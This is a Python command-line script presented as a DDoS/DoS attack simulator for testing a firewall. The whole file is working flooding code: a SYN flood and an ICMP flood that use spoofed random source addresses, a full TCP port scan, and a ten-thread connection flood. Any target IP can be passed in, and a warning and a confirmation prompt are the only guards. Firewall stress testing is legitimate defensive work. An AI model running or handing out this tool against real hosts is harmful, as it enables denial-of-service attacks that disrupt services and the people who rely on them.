#!/usr/bin/env python3
"""
DDoS/DoS Attack Simulator for testing the firewall
WARNING: Use only for testing your own systems!
"""

import socket
import threading
import time
import random
from scapy.all import IP, TCP, UDP, ICMP, send
import argparse

def syn_flood_attack(target_ip, target_port, duration=10):
    """Simulate SYN flood attack"""
    print(f"Starting SYN flood attack on {target_ip}:{target_port} for {duration} seconds")
    end_time = time.time() + duration
    
    while time.time() < end_time:
        # Random source IP and port
        src_ip = f"192.168.{random.randint(1,255)}.{random.randint(1,255)}"
        src_port = random.randint(1024, 65535)
        
        # Create SYN packet
        packet = IP(src=src_ip, dst=target_ip) / TCP(sport=src_port, dport=target_port, flags="S")
        
        try:
            send(packet, verbose=0)
        except Exception as e:
            print(f"Error sending packet: {e}")
            break
        
        time.sleep(0.001)  # Small delay to avoid overwhelming

def port_scan_attack(target_ip, duration=10):
    """Simulate port scanning"""
    print(f"Starting port scan on {target_ip} for {duration} seconds")
    end_time = time.time() + duration
    port = 1
    
    while time.time() < end_time and port < 65535:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.1)
            result = sock.connect_ex((target_ip, port))
            sock.close()
            port += 1
            time.sleep(0.01)
        except Exception:
            break

def icmp_flood_attack(target_ip, duration=10):
    """Simulate ICMP flood"""
    print(f"Starting ICMP flood on {target_ip} for {duration} seconds")
    end_time = time.time() + duration
    
    while time.time() < end_time:
        # Random source IP
        src_ip = f"10.0.{random.randint(1,255)}.{random.randint(1,255)}"
        
        # Create ICMP packet
        packet = IP(src=src_ip, dst=target_ip) / ICMP()
        
        try:
            send(packet, verbose=0)
        except Exception as e:
            print(f"Error sending packet: {e}")
            break
        
        time.sleep(0.001)

def connection_flood_attack(target_ip, target_port, duration=10):
    """Simulate connection flooding"""
    print(f"Starting connection flood on {target_ip}:{target_port} for {duration} seconds")
    end_time = time.time() + duration
    threads = []
    
    def make_connection():
        while time.time() < end_time:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                sock.connect((target_ip, target_port))
                time.sleep(0.1)
                sock.close()
            except Exception:
                pass
            time.sleep(0.01)
    
    # Start multiple connection threads
    for _ in range(10):
        thread = threading.Thread(target=make_connection)
        thread.daemon = True
        thread.start()
        threads.append(thread)
    
    # Wait for completion
    time.sleep(duration)
    for thread in threads:
        thread.join(timeout=1)

def main():
    parser = argparse.ArgumentParser(description='DDoS/DoS Attack Simulator for testing')
    parser.add_argument('target_ip', help='Target IP address')
    parser.add_argument('--port', type=int, default=80, help='Target port (default: 80)')
    parser.add_argument('--duration', type=int, default=30, help='Attack duration in seconds (default: 30)')
    parser.add_argument('--attack-type', choices=['syn', 'port', 'icmp', 'conn', 'all'], 
                       default='all', help='Type of attack to simulate')
    
    args = parser.parse_args()
    
    print(f"⚠️  WARNING: This will simulate attacks against {args.target_ip}")
    print("   Only use this against systems you own or have permission to test!")
    
    response = input("Continue? (y/N): ")
    if response.lower() != 'y':
        print("Aborted.")
        return
    
    attacks = {
        'syn': lambda: syn_flood_attack(args.target_ip, args.port, args.duration),
        'port': lambda: port_scan_attack(args.target_ip, args.duration),
        'icmp': lambda: icmp_flood_attack(args.target_ip, args.duration),
        'conn': lambda: connection_flood_attack(args.target_ip, args.port, args.duration)
    }
    
    if args.attack_type == 'all':
        print("Running all attack types...")
        for attack_name, attack_func in attacks.items():
            print(f"\n--- Running {attack_name} attack ---")
            try:
                attack_func()
            except KeyboardInterrupt:
                print(f"\n{attack_name} attack interrupted")
                break
            except Exception as e:
                print(f"Error in {attack_name} attack: {e}")
    else:
        print(f"Running {args.attack_type} attack...")
        try:
            attacks[args.attack_type]()
        except KeyboardInterrupt:
            print("\nAttack interrupted")
        except Exception as e:
            print(f"Error: {e}")
    
    print("Attack simulation completed.")

if __name__ == "__main__":
    main()
